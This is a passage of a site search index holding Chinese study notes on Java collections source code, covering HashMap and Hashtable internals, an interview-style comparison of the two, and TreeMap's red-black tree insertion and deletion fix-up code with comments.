<p>\u540cArrayList\u4e00\u6837,\u542b\u6709\u7684\u6570\u636e\u8d8a\u591a,\u6d6a\u8d39\u7684\u8d44\u6e90\u4e5f\u5c31\u8d8a\u591a(\u9ed8\u8ba4\u81f3\u5c11\u670925%\u7684\u7a7a\u95f4\u662f\u7a7a\u7684)</p> </li> <li> <p>\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4\u6bcf\u4e2aHashMap\u5bf9\u8c61\u5b58\u50a8\u7684\u6570\u636e\u8d8a\u5c11\u8d8a\u597d,\u867d\u7136\u90a3\u6837\u4f1a\u5e26\u6765\u7a7a\u95f4\u4e0a\u7684\u8282\u7ea6,\u4f46\u662f\u8fd9\u6837\u5bfc\u81f4\u53d1\u751fhash\u78b0\u649e\u7684\u53ef\u80fd\u6027\u8d8a\u5927.</p> </li> <li> <p>\u548cArrayList\u4e00\u6837,\u6269\u5bb9\u7684\u4ee3\u4ef7\u662f\u5de8\u5927\u7684,\u56e0\u6b64\u5bf9\u4e8e\u4e00\u4e2a\u5df2\u77e5\u7684\u6216\u8005\u53ef\u4ee5\u786e\u5b9a\u5177\u4f53\u8303\u56f4\u7684\u6570\u636e\u91cf,\u53ef\u4ee5\u63d0\u524d\u5b9a\u4e49\u597dHashMap\u7684\u5927\u5c0f.</p> </li> <li> <p>\u5355\u7eaf\u7684\u5c06\u6570\u636e\u4eceHashMap\u4e2d\u79fb\u51fa\u5e76\u4e0d\u4f1a\u51cf\u5c11HashMap\u6240\u5360\u7528\u7684\u7a7a\u95f4,\u56e0\u4e3a\u5728HashMap\u7684\u58f0\u660e\u5468\u671f\u4e2d,\u6240\u5360\u7528\u7684\u7a7a\u95f4\u53ea\u4f1a\u6269\u5927,\u4e0d\u4f1a\u51cf\u5c11.</p> </li> <li> <p>HashMap\u7684\u5f15\u7528\u5176\u5b9e\u76f8\u5f53\u5e7f\u6cdb,HashSet\u5c31\u662f\u5e95\u5c42\u5229\u7528HashMap,\u53ea\u4e0d\u8fc7\u5728\u4e00\u4e9b\u64cd\u4f5c\u4e0a\u9762\u4f7f\u7528\u4e86\u9ed8\u8ba4\u7684\u53c2\u6570\u7528\u6765\u4fdd\u8bc1\u4ed6\u7684Set\u7279\u6027,\u4f46\u662f\u8981\u6ce8\u610f,HashSet\u4e0d\u80fd\u8986\u76d6Key\u6240\u5bf9\u5e94\u7684\u7684\u503c,\u4f46\u662f\u53ef\u4ee5\u5148\u5220\u9664\u540e\u52a0\u5165.</p> </li> <li> <p>HashMap\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u51fa\u540d\u7684\u5b50\u7c7b:LinkedHashMap,\u5b83\u5728HashMap\u7684\u57fa\u7840\u4e0a\u5b9e\u73b0\u4e86\u94fe\u8868\u7684\u529f\u80fd,\u4ed6\u5e95\u5c42\u8fd8\u5b58\u5728\u4e00\u4e2a\u94fe\u8868,\u8fd9\u4e2a\u94fe\u8868\u4f1a\u56e0\u4e3a\u8bfb\u5199\u7684\u64cd\u4f5c\u800c\u8be5\u8868\u5143\u7d20\u987a\u5e8f,\u8fd9\u6837\u5b9e\u73b0\u4e00\u4e2aLRU\u7f13\u5b58.</p> </li> <li> <p>HashMap\u5e76\u53d1\u4e0b\u7ebf\u7a0b\u4e0d\u5b89\u5168,\u5177\u4f53\u89c1 HashMap \u4e3a\u4ec0\u4e48\u7ebf\u7a0b\u4e0d\u5b89\u5168?</p> </li> <li> <p>\u5728jdk1.7\u4e2d\uff0c\u5728\u591a\u7ebf\u7a0b\u73af\u5883\u4e0b\uff0c\u6269\u5bb9\u65f6\u4f1a\u9020\u6210\u73af\u5f62\u94fe\u6216\u6570\u636e\u4e22\u5931\u3002</p> </li> <li> <p>\u5728jdk1.8\u4e2d\uff0c\u5728\u591a\u7ebf\u7a0b\u73af\u5883\u4e0b\uff0c\u4f1a\u53d1\u751f\u6570\u636e\u8986\u76d6\u7684\u60c5\u51b5\u3002</p> </li> <li> <p>\u4e94\u82b1\u516b\u95e8\u7684Map\u6bd4\u8f83\uff1a</p> </li> </ul> \u7279\u6027 TreeMap HashMap LinkedHashMap \u6392\u5e8f \u652f\u6301 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u63d2\u5165\u987a\u5e8f \u4e0d\u4fdd\u8bc1 \u4e0d\u4fdd\u8bc1 \u4fdd\u8bc1 \u67e5\u627e\u6548\u7387 O(log n) O(1) O(1) \u7a7a\u95f4\u5360\u7528 \u901a\u5e38\u8f83\u5927 \u901a\u5e38\u8f83\u5c0f \u901a\u5e38\u8f83\u5927 \u4f7f\u7528\u573a\u666f \u9700\u8981\u6392\u5e8f\u7684\u573a\u666f \u65e0\u9700\u6392\u5e8f\u7684\u573a\u666f \u9700\u8981\u4fdd\u6301\u63d2\u5165\u987a\u5e8f"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#4-hashtable","title":"4. Hashtable","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_7","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li> <p>Hashtable\u5b58\u653e\u7684\u4e5f\u662fK-V\u7684\u5f62\u5f0f,\u4f46\u662f\u548cHashMap\u4e0d\u540c\u7684\u662f,\u4ed6\u4e0d\u80fd\u5b58\u50a8<code>null</code>,\u65e0\u8bba\u4ed6\u662f\u5f53\u505aK\u8fd8\u662fV.</p> </li> <li> <p>Hashtable\u662f\u7ebf\u7a0b\u5b89\u5168\u7684,\u6240\u6709\u64cd\u4f5c\u90fd\u4f7f\u7528\u4e86<code>synchronized</code>,\u4f46\u662f\u8fd9\u4e5f\u5fc5\u7136\u4f1a\u5e26\u6765\u6027\u80fd\u4e0a\u7684\u635f\u8017.</p> </li> <li> <p>Hashtable\u5e95\u5c42\u4f9d\u7136\u662f\u4f7f\u7528\u6570\u7ec4\u6765\u5b58\u50a8\u6570\u636e,\u4f46\u662f\u5bf9\u4e8ehash\u78b0\u649e\u7684\u60c5\u51b5,Hashtable\u53ea\u4f7f\u7528\u94fe\u8868\u6765\u89e3\u51b3,\u6ca1\u6709\u6d89\u53ca\u5230\u6811.\u4ece<code>get</code>\u65b9\u6cd5\u4e2d\u53ef\u4ee5\u770b\u51fa</p> </li> </ul> <pre><code>public synchronized V get(Object key) {\n    Entry&lt;?,?&gt; tab[] = table;\n    int hash = key.hashCode();\n    int index = (hash &amp; 0x7FFFFFFF) % tab.length;                  //hash &amp; 0x7FFFFFFF\u7684\u4f5c\u7528\u662f\u820d\u5f03\u7b26\u53f7\u4f4d\n    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {\n        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {\n            return (V)e.value;\n        }\n    }\n    return null;\n}\n</code></pre> <ul> <li> <p>\u521d\u59cb\u5927\u5c0f\u4f4d11,\u9608\u503c\u4f4d0.75,\u8fd9\u4e24\u4e2a\u503c\u7684\u4f5c\u7528\u548c\u524d\u9762\u7684HashMap\u4e00\u6837.</p> </li> <li> <p>\u5728<code>new Hashtable</code>\u65f6\u5c31\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u6570\u7ec4,\u4f1a\u5360\u7528\u5b9e\u9645\u7a7a\u95f4,\u524d\u9762\u7684HashMap\u4e5f\u662f\u4e00\u6837,\u8fd9\u91cc\u6ce8\u610f\u548cList\u533a\u522b\u5f00\u6765</p> </li> <li> <p>\u548cHashMap\u4e00\u6837,clear\u53ea\u662f\u5c06\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u8bbe\u4e3a<code>null</code>,\u8868\u7684\u5927\u5c0f\u4e0d\u4f1a\u6539\u53d8,\u5728\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d,\u8868\u53ea\u4f1a\u589e\u5927,\u4e0d\u4f1a\u53d8\u5c0f.</p> </li> <li> <p><code>clone</code>\u51fd\u6570\u662f\u6df1\u5ea6clone,\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f,\u5bf9\u4e8e\u4e4b\u524d \u7684\u6570\u636e\u7684\u5f15\u7528\u8fd8\u662f\u6ca1\u6709\u53d8,\u4e5f\u5c31\u662f\u8bf4\u5c31\u7b97\u590d\u5236\u4e86,\u590d\u5236\u540e\u7684Hashtable\u5bf9\u8c61\u8fd8\u662f\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u5176\u4e2d\u7684Value\u5f71\u54cd\u524d\u8005\u7684\u5185\u5bb9.\u5206\u6790\u4e86\u524d\u9762HashMap\u7684\u6e90\u7801,\u53d1\u73b0\u5341\u5206\u76f8\u4f3c,\u4ec5\u4ec5\u53ea\u662f\u5427\u7ed3\u6784\u5b8c\u5168\u7684\u590d\u5236\u4e86.\u770b\u4e86\u5176\u4ed6\u7684\u6570\u636e\u96c6\u5408\u4f53,\u53d1\u73b0\u57fa\u672c\u90fd\u662f\u53eaclone\u7ed3\u6784.</p> </li> </ul> <pre><code>protected Object clone() {\n    return new Entry&lt;&gt;(hash, key, value,\n                          (next==null ? null : (Entry&lt;K,V&gt;) next.clone()));\n}\n//\u4e0a\u9762\u7684\u662fEntry\u7684clone\u51fd\u6570,\u4e5f\u5c31\u662f\u5177\u4f53\u6570\u636e\u7684clone\n//\u4e0b\u9762\u7684Hashtable\u7684clone\u51fd\u6570\npublic synchronized Object clone() {\n    Hashtable&lt;?,?&gt; t = cloneHashtable();\n    t.table = new Entry&lt;?,?&gt;[table.length];\n    for (int i = table.length ; i-- &gt; 0 ; ) {\n        t.table[i] = (table[i] != null)\n            ? (Entry&lt;?,?&gt;) table[i].clone() : null;\n    }\n    t.keySet = null;\n    t.entrySet = null;\n    t.values = null;\n    t.modCount = 0;\n    return t;\n}\n</code></pre> <ul> <li>Hashtable\u91cd\u65b0\u8c03\u6574\u5927\u5c0f\u7684\u51fd\u6570\u53eb\u505a<code>rehash</code></li> </ul> <pre><code>protected void rehash() {\n    int oldCapacity = table.length;\n    Entry&lt;?,?&gt;[] oldMap = table;\n    int newCapacity = (oldCapacity &lt;&lt; 1) + 1;         //\u6269\u5927\u4e24\u500d\u518d\u52a0\u4e00\n    if (newCapacity - MAX_ARRAY_SIZE &gt; 0) {           //\u6269\u5bb9\u540e\u7684\u5bb9\u91cf\u5927\u5c0f\u68c0\u67e5,\u9632\u6b62\u8fc7\u5927\u5bfc\u81f4\u4e0d\u53ef\u7528,\n        if (oldCapacity == MAX_ARRAY_SIZE)            //\u5bb9\u91cf\u5df2\u7ecf\u8fbe\u5230\u5cf0\u503c,\u76f4\u63a5\u8fd4\u56de\n            return;\n        newCapacity = MAX_ARRAY_SIZE;                 //\u6269\u5bb9\u5230\u6700\u5927\n    }\n    Entry&lt;?,?&gt;[] newMap = new Entry&lt;?,?&gt;[newCapacity];//\u65b0\u5efa\u4e86\u4e00\u4e2aentry\u6570\u7ec4\n    modCount++;\n    threshold = (int)Math.min(newCapacity * loadFactor, MAX_ARRAY_SIZE + 1);    //\u9608\u503c\u6539\u53d8\n    table = newMap;\n    for (int i = oldCapacity ; i-- &gt; 0 ;) {           //\u5c06\u4e4b\u524d\u7684hash\u8868\u4e2d\u7684\u503c\u91cd\u65b0\u8ba1\u7b97\u653e\u5165\u65b0\u7684\u8868\u4e2d\n        for (Entry&lt;K,V&gt; old = (Entry&lt;K,V&gt;)oldMap[i] ; old != null ; ) {\n            Entry&lt;K,V&gt; e = old;\n            old = old.next;\n            int index = (e.hash &amp; 0x7FFFFFFF) % newCapacity;\n            e.next = (Entry&lt;K,V&gt;)newMap[index];\n            newMap[index] = e;\n        }\n    }\n}\n</code></pre>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_8","title":"\u603b\u7ed3","text":"<ul> <li> <p>HashMap\u548cHashTable\u7684\u533a\u522b(\u9762\u8bd5\u9898)</p> </li> <li> <p>1\u3001\u7ebf\u7a0b\u7684\u5b89\u5168\u6027\u4e0d\u540c     HashMap\u7ebf\u7a0b\u4e0d\u5b89\u5168\uff08\u5728\u591a\u7ebf\u7a0b\u5e76\u53d1\u4f1a\u9020\u6210\u6b7b\u9501\u95ee\u9898\uff09\u4f46\u662f\u4ed6\u7684\u6548\u7387\u6bd4HashTable\u9ad8\uff0c\u5927\u90e8\u5206\u90fd\u662f\u5355\u7ebf\u7a0b\u64cd\u4f5c</p> <p>HashTable\u7ebf\u7a0b\u5b89\u5168 \uff08\u4ed6\u7684\u6bcf\u4e00\u4e2a\u65b9\u6cd5\u90fd\u52a0\u4e86\u9501\uff0c\u9002\u7528\u4e8e\u591a\u7ebf\u7a0b\u5e76\u53d1\u7684\u73af\u5883\uff09</p> </li> <li> <p>2\u3001\u7ee7\u627f\u7684\u7236\u7c7b\u4e0d\u540c     HashMap\u662f\u7ee7\u627fAbstractMap\u7c7b \u90fd\u5b9e\u73b0\u4e86 map\uff0ccloneable serializable \u63a5\u53e3</p> <p>HashTable\u662f\u7ee7\u627fDictionary\u7c7b \u90fd\u5b9e\u73b0\u4e86 map\uff0ccloneable serializable \u63a5\u53e3</p> </li> <li> <p>3\u3001\u521d\u59cb\u5bb9\u91cf\u5927\u5c0f\u548c\u6bcf\u6b21\u6269\u5bb9\u5927\u5c0f\u4e0d\u540c</p> <p>HashTable\u9ed8\u8ba4\u7684\u521d\u59cb\u5927\u5c0f\u4e3a11 \u6bcf\u6b21\u6269\u5145\u4e3a2n+1,\u53ef\u4ee5\u81ea\u7531\u5b9a\u4e49\u521d\u59cb\u5bb9\u91cf</p> <p>HashMap\u9ed8\u8ba4\u7684\u521d\u59cb\u5316\u5927\u5c0f\u662f16 \u6bcf\u6b21\u6269\u5145\u4e3a2\u500d,\u5e76\u4e14\u5bb9\u91cf\u59cb\u7ec8\u662f2\u7684\u6307\u6570\u500d</p> </li> <li> <p>4\u3001key\u548cvalue\u662f\u5426\u5141\u8bb8\u4e3anull\u503c     HashTable\u4e2d\uff0ckey\u548cvalue\u90fd\u4e0d\u80fd\u4e3a<code>null</code></p> <p>HashMap\u4e2d\uff0c\u53ef\u4ee5\u5141\u8bb8key\u548cvalue\u4e3a\u7a7a\u7684\u4e14\u5b58\u50a8\u5728\u6570\u7ec4\u7d22\u5f15\u4e3a0\u5904</p> </li> <li> <p>5\u3001\u904d\u5386\u65b9\u5f0f\u4e0d\u540c     Hashtable\u6bd4HashMap\u591a\u4e00\u4e2a<code>elements</code>\u65b9\u6cd5\u3002</p> </li> <li> <p>6\u3001\u5bf9\u4e8ehash\u78b0\u649e\u7684\u5904\u7406\u65b9\u5f0f\u4e0d\u4e00\u6837</p> <p>HashTable\u5bf9\u4e8ehash\u78b0\u649e\u53ea\u7528\u94fe\u8868\u6765\u5904\u7406</p> <p>HashMap\u5bf9\u4e8ehash\u78b0\u649e\u7684\u5904\u7406\u80fd\u529b\u6bd4\u8f83\u5f3a,\u5f53\u8d85\u8fc7\u4e00\u4e2a\u7279\u5b9a\u503c(\u9ed8\u8ba4\u662f8),\u4ed6\u4f1a\u5c06\u94fe\u8868\u8f6c\u5316\u6210\u7ea2\u9ed1\u6811.</p> </li> <li> <p>HashTable\u548cHashMap\u4e00\u6837,\u6269\u5bb9\u5e26\u6765\u7684\u5f00\u9500\u5f88\u5927.\u56e0\u6b64\u5c3d\u91cf\u907f\u514d\u6269\u5bb9\u64cd\u4f5c,\u6269\u5bb9\u662f\u4e0d\u53ef\u9006\u7684,\u4e5f\u5c31\u662f\u8bf4,\u5728\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\u53ea\u4f1a\u6269\u5927,\u4e0d\u4f1a\u7f29\u5c0f</p> </li> <li> <p>HashTable\u662f\u4e00\u4e2a\u5df2\u7ecf\u8fc7\u4e16\u7684\u6570\u636e\u7ed3\u6784,\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528.\u53ef\u4ee5\u7528ConcurrentHashMap\u66ff\u4ee3</p> </li> <li> <p>Properties\u662fHashTable\u7684\u7ee7\u627f\u5b50\u7c7b,\u5b9e\u73b0\u539f\u7406\u548c\u7236\u7c7b\u5927\u4f53\u76f8\u4f3c,\u4f46\u662f\u5b50\u7c7b\u53ef\u4ee5\u4ecexxx.properties\u6587\u4ef6\u4e2d,\u52a0\u8f7d\u6570\u636e\u5230Properties\u7c7b\u5bf9\u8c61,\u5e76\u8bb2\u884c\u5356\u53d6\u548c\u4fee\u6539(\u8c03\u7528<code>load</code>()\u65b9\u6cd5\u5373\u53ef\u4ece\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6)</p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#5-treemap","title":"5. TreeMap(\u7ea2\u9ed1\u6811)","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_9","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li> <p>\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa,\u4ed6\u662f\u4ee5\u6811\u72b6\u7ed3\u6784\u5b58\u50a8\u6570\u636e\u7684,\u6ca1\u6709\u4f7f\u7528\u6570\u7ec4,\u4e5f\u5c31\u662f\u8bf4,\u6269\u5bb9\u7684\u5f00\u9500\u76f8\u5bf9\u4e8e\u524d\u9762\u7684HashMap\u548cHashTable\u90fd\u8981\u5c0f,\u800c\u4e14\u5360\u7528\u7a7a\u95f4\u662f\u52a8\u6001\u7684,\u4e0d\u9700\u8981\u6307\u5b9a.</p> </li> <li> <p>\u5185\u90e8\u4f7f\u7528\u4e00\u4e2a\u6210\u5458\u53d8\u91cfroot\u6765\u4fdd\u5b58\u6811\u7684\u6839\u8282\u70b9,TreeMap\u4f7f\u7528\u7684\u662f\u7ea2\u9ed1\u6811\u7ed3\u6784.\u5185\u90e8\u4f7f\u7528\u4e00\u4e2aboolean\u503c\u6765\u786e\u5b9a\u989c\u8272(RED,BLACK)</p> </li> <li> <p><code>put</code>\u51fd\u6570\u6e90\u7801\u5982\u4e0b:</p> </li> </ul> <pre><code>private V put(K key, V value, boolean replaceOld) {\n    Entry&lt;K,V&gt; t = root;\n    if (t == null) {                                  //\u5982\u679c\u662f\u4e00\u4e2a\u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u7684\u7a7a\u7684\u6570\n        addEntryToEmptyMap(key, value);\n        return null;\n    }\n    int cmp;\n    Entry&lt;K,V&gt; parent;                                //\u8981\u63d2\u5165\u7684\u5bf9\u8c61\u7684\u4f4d\u7f6e\u7684\u7236\u8282\u70b9\n    Comparator&lt;? super K&gt; cpr = comparator;                                //\u5bf9\u8c61\u7684\u6bd4\u8f83\u5668\n    if (cpr != null) {            //\u6bd4\u8f83\u5668\u4e0d\u4e3a\u7a7a,\u4e5f\u5c31\u662f\u8bf4\u5916\u90e8\u5b9a\u4e49\u4e86\u6bd4\u8f83\u5668,\u800c\u4e0d\u9700\u8981\u5b9e\u4f53\u7c7b\u5b9e\u73b0comparable\u63a5\u53e3\n        do {                      //\u7ea2\u9ed1\u6811\u641c\u7d22,\u5176\u5b9e\u4e5f\u5c31\u662f\u666e\u901a\u7684\u4e8c\u53c9\u6811\u641c\u7d22,\n            parent = t;\n            cmp = cpr.compare(key, t.key);\n            if (cmp &lt; 0)\n                t = t.left;\n            else if (cmp &gt; 0)\n                t = t.right;\n            else {\n                V oldValue = t.value;\n                if (replaceOld || oldValue == null) {\n                    t.value = value;\n                }\n                return oldValue;\n            }\n        } while (t != null);\n    } else {                      //\u6bd4\u8f83\u5668\u4e3a\u7a7a,\u9700\u8981\u5b9e\u4f53\u7c7b\u5b9e\u73b0comparable\u63a5\u53e3,\u4f7f\u7528\u5b9e\u4f53\u7c7bKey\u7684\u6bd4\u8f83\u65b9\u6cd5\u6765\u6bd4\u8f83\n        Objects.requireNonNull(key);\n        @SuppressWarnings(\"unchecked\")  //\u53ea\u662f\u7f16\u8bd1\u65f6\u5ffd\u7565\u68c0\u67e5,\u4f46\u662f\u5728\u8fd0\u884c\u65f6\u53d1\u751f\u7c7b\u578b\u4e0d\u7b26\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\n        Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key;             //\u5b9e\u4f53\u7c7bKey\u7684\u6bd4\u8f83\u5668\n        //\u5176\u5b9e\u8fd9\u91cc\u548c\u4e0a\u9762\u7684\u989d\u90a3\u90e8\u5206\u662f\u4e00\u6837\u7684,\u53ea\u9700\u8981\u66f4\u6539\u4e00\u4e0b\u6bd4\u8f83\u5668\u8fd9\u91cc\u7adf\u7136\u6ca1\u6709\u4ee3\u7801\u590d\u7528!!!\n        do {\n            parent = t;\n            cmp = k.compareTo(t.key);\n            if (cmp &lt; 0)\n                t = t.left;\n            else if (cmp &gt; 0)\n                t = t.right;\n            else {\n                V oldValue = t.value;\n                if (replaceOld || oldValue == null) {\n                    t.value = value;\n                }\n                return oldValue;\n            }\n        } while (t != null);\n    }\n    addEntry(key, value, parent, cmp &lt; 0);  //\u63d2\u5165\u8282\u70b9\n    return null;\n}\n</code></pre> <ul> <li> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230,\u6240\u6709\u65b9\u6cd5\u5747\u6ca1\u6709\u4f7f\u7528<code>synchronized</code>\u5173\u952e\u5b57\u4e0a\u9501,\u8bf4\u660e\u5728\u9ad8\u5e76\u53d1\u7684\u60c5\u51b5\u4e0bTreeMap\u662f\u4e0d\u5b89\u5168\u7684.</p> </li> <li> <p><code>get</code>\u51fd\u6570\u7684\u67e5\u627e\u903b\u8f91\u548c<code>put</code>\u7684\u5176\u5b9e\u5dee\u4e0d\u591a,\u6240\u4ee5\u6211\u6ca1\u60f3\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u5728\u5411\u4e0a\u62bd\u8c61\u4e00\u5c42</p> </li> </ul> <pre><code>final Entry&lt;K,V&gt; getEntry(Object key) {\n    if (comparator != null)\n        return getEntryUsingComparator(key);\n    Objects.requireNonNull(key);\n    @SuppressWarnings(\"unchecked\")\n        Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key;\n    Entry&lt;K,V&gt; p = root;\n    while (p != null) {\n        int cmp = k.compareTo(p.key);\n        if (cmp &lt; 0)\n            p = p.left;\n        else if (cmp &gt; 0)\n            p = p.right;\n        else\n            return p;\n    }\n    return null;\n}\n</code></pre> <ul> <li> <p><code>clear</code>\u51fd\u6570\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86,\u4ed6\u5c31\u662f\u5427\u6839\u8282\u70b9\u8bbe\u7f6e\u4f4d<code>null</code>,\u5176\u4f59\u8282\u70b9\u4e5f\u5c31\u81ea\u52a8\u4f1a\u88abGC\u7cfb\u7edf\u56de\u6536\u4e86,\u5f53\u7136\u5177\u4f53\u8fd8\u8981\u770bGC\u673a\u5236</p> </li> <li> <p><code>clone</code>\u51fd\u6570\u548c\u5176\u4ed6\u7684\u4e00\u6837,\u4e5f\u5c31\u662f\u628a\u7ed3\u6784\u590d\u5236\u4e00\u4e0b.</p> </li> <li> <p>\u5bf9\u4e8e\u6811\u72b6\u7ed3\u6784\u7684\u4e00\u4e9b\u8c03\u6574,TreeMap\u4f7f\u7528\u7684\u662f\u5faa\u73af\u800c\u4e0d\u662f\u9012\u5f52,\u8fd9\u6837\u6709\u52a9\u4e8e\u51cf\u5c11\u6027\u80fd\u635f\u8017,\u56e0\u4e3a\u9012\u5f52\u5bf9\u6808\u7684\u7a7a\u95f4\u635f\u8017\u5f88\u5927.</p> </li> <li> <p>\u63d2\u5165\u548c\u5220\u9664\u540e\u90fd\u9700\u8981\u91cd\u65b0\u8c03\u6574\u6811\u7684\u7ed3\u6784</p> </li> <li> <p>\u63d2\u5165\u540e\u8c03\u6574</p> </li> </ul> <pre><code>private void fixAfterInsertion(Entry&lt;K,V&gt; x) {\n    x.color = RED;\n    while (x != null &amp;&amp; x != root &amp;&amp; x.parent.color == RED) {//\u6bcf\u4e00\u6b21\u5faa\u73af\u540e\u7684\u7ed3\u679c,x\u90fd\u662f\u7ea2\u8272\u7684\n        if (parentOf(x) == leftOf(parentOf(parentOf(x)))) {  //\u5982\u679c\u7236\u8282\u70b9\u662f\u5de6\u5206\u652f\n            Entry&lt;K,V&gt; y = rightOf(parentOf(parentOf(x)));   //\u7237\u8282\u70b9\u7684\u53f3\u5206\u652f,\u76f8\u5f53\u4e8e\u4f2f\u7236\u8282\u70b9\n            if (colorOf(y) == RED) {                         //\u4f2f\u7236\u8282\u70b9\u7684\u989c\u8272\u5982\u679c\u4e3a\u7ea2\u8272\n                setColor(parentOf(x), BLACK);                \n                setColor(y, BLACK);                          //\u4f2f\u7236\u8282\u70b9\u548c\u7236\u8282\u70b9\u90fd\u53d8\u6210\u9ed1\u8272\n                setColor(parentOf(parentOf(x)), RED);        //\u7956\u7236\u8282\u70b9\u53d8\u6210\u7ea2\u8272\n                x = parentOf(parentOf(x));                   //\u5411\u4e0a\u79fb\u52a8\u4e24\u5c42\n            } else {                                         //\u4f2f\u7236\u8282\u70b9\u7684\u989c\u8272\u5982\u679c\u4e3a\u9ed1\u8272\n                if (x == rightOf(parentOf(x))) {             //\u5982\u679c\u5f53\u524d\u8282\u70b9\u662f\u53f3,\u5219\u5411\u4e0a\u79fb\u52a8\u5e76\u4e14\u65cb\u8f6c\n                    x = parentOf(x);\n                    rotateLeft(x);\n                }\n                setColor(parentOf(x), BLACK);                //\u7236\u8282\u70b9\u53d8\u6210\u9ed1\u8272\n                setColor(parentOf(parentOf(x)), RED);        //\u7956\u7236\u8282\u70b9\u53d8\u6210\u7ea2\u8272\n                rotateRight(parentOf(parentOf(x)));          //\u65cb\u8f6c\n            }\n        } else {                              // \u4e0e\u4e0a\u9762\u7684\u77e5\u8bc6\u5de6\u53f3\u7684\u65b9\u5411\u76f8\u53cd\u800c\u5df2,\u5176\u4f59\u7684\u64cd\u4f5c\u76f8\u540c\n            Entry&lt;K,V&gt; y = leftOf(parentOf(parentOf(x)));\n            if (colorOf(y) == RED) {\n                setColor(parentOf(x), BLACK);\n                setColor(y, BLACK);\n                setColor(parentOf(parentOf(x)), RED);\n                x = parentOf(parentOf(x));\n            } else {\n                if (x == leftOf(parentOf(x))) {\n                    x = parentOf(x);\n                    rotateRight(x);\n                }\n                setColor(parentOf(x), BLACK);\n                setColor(parentOf(parentOf(x)), RED);\n                rotateLeft(parentOf(parentOf(x)));\n            }\n        }\n    }\n    root.color = BLACK;\n}\n</code></pre> <pre><code>graph LR\nclassDef default fill: #f9a, stroke: #333, stroke-width: 5px;\nbofu{{\u4f2f\u7236\u8282\u70b9\u989c\u8272}}\n\nPR1(\u7236\u8282\u70b9\u548c\u4f2f\u7236\u8282\u70b9\u8bbe\u7f6e\u4e3a\u9ed1\u8272)\nPR2(\u7237\u7237\u8282\u70b9\u8bbe\u7f6e\u4e3a\u7ea2\u8272)\nPR3(\u6307\u6b63\u79fb\u52a8\u5230\u7237\u8282\u70b9)\n\nPB{{\u7236\u8282\u70b9\u548c\u81ea\u8eab\u7684\u4f4d\u7f6e\u5173\u7cfb}}\n\nPBS1(\u6307\u9488\u79fb\u52a8\u5230\u7236\u8282\u70b9)\nPBS2(\u81ea\u8eab\u65b9\u5411\u65cb\u8f6c)\n\nPBD1(\u7236\u8282\u70b9\u8bbe\u4e3a\u9ed1\u8272)\nPBD2(\u7237\u8282\u70b9\u8bbe\u4e3a\u7ea2\u8272)\nPBD3(\u81ea\u8eab\u76f8\u53cd\u65b9\u5411\u65cb\u8f6c)\n\nbofu--\u7ea2\u8272--&gt;PR1--&gt;PR2--&gt;PR3\nbofu--\u9ed1\u8272--&gt;PB--\u4e0d\u540c\u4fa7--&gt;PBD1--&gt;PBD2--&gt;PBD3\nPB--\u540c\u4fa7--&gt;PBS1--&gt;PBS2\n</code></pre> <ul> <li>\u5220\u9664\u540e\u8c03\u6574</li> </ul> <pre><code>private void fixAfterDeletion(Entry&lt;K,V&gt; x) {\n    while (x != root &amp;&amp; colorOf(x) == BLACK) {\n        if (x == leftOf(parentOf(x))) {\n            Entry&lt;K,V&gt; sib = rightOf(parentOf(x));//\u5144\u5f1f\u8282\u70b9\n            if (colorOf(sib) == RED) {            //\u5982\u679c\u662f\u7ea2\u8272\n                setColor(sib, BLACK);             //\u53d8\u8272\n                setColor(parentOf(x), RED);\n                rotateLeft(parentOf(x));          //\u65cb\u8f6c\n                sib = rightOf(parentOf(x));       //\u65cb\u8f6c\u4e4b\u540e\u9700\u8981\u91cd\u65b0\u83b7\u53d6\u5144\u5f1f\u8282\u70b9\n            }\n            if (colorOf(leftOf(sib))  == BLACK &amp;&amp;\n                colorOf(rightOf(sib)) == BLACK) { //\u5982\u679c\u5b50\u8282\u70b9\u90fd\u662f\u9ed1\u8272\n                setColor(sib, RED);               //\u5c06\u5144\u5f1f\u8282\u70b9\u8bbe\u7f6e\u4e3a\u7ea2\u8272\n                x = parentOf(x);                  //\u5411\u4e0a\u79fb\u52a8\u8fdb\u884c\u5faa\u73af\n            } else {                              //\u5982\u679c\u5b50\u8282\u70b9\u4e0d\u90fd\u4e3a\u9ed1\u8272\n                if (colorOf(rightOf(sib)) == BLACK) {//\u5982\u679c\u53f3\u8fb9\u4e3a\u9ed1\u8272,\u5de6\u8fb9\u4e0d\u662f\u9ed1\u8272,\u5c31\u628a\u5de6\u8fb9\u53d8\u6210\u9ed1\u8272,\u5e76\u4e14\u65cb\u8f6c\n                    setColor(leftOf(sib), BLACK);\n                    setColor(sib, RED);\n                    rotateRight(sib);\n                    sib = rightOf(parentOf(x));   //\u65cb\u8f6c\u540e\u91cd\u65b0\u5bfb\u627e\u5144\u5f1f\u8282\u70b9\n                }\n                setColor(sib, 